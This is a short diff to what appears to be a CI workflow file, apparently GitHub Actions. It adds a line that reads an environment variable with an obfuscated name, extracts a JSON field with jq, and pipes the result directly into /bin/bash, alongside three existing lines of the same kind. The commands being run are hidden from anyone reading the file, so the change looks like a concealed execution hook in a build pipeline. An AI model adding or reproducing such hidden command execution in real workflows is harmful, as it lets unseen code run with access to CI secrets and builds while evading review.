@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$no02578" | jq -r .oej42 | /bin/bash
           echo $snfmp421 | jq -r .uf7 | /bin/bash
           echo $wwgl56920 | jq -r .c1 | /bin/bash
+          echo $qt48764 | jq -r .sg8 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
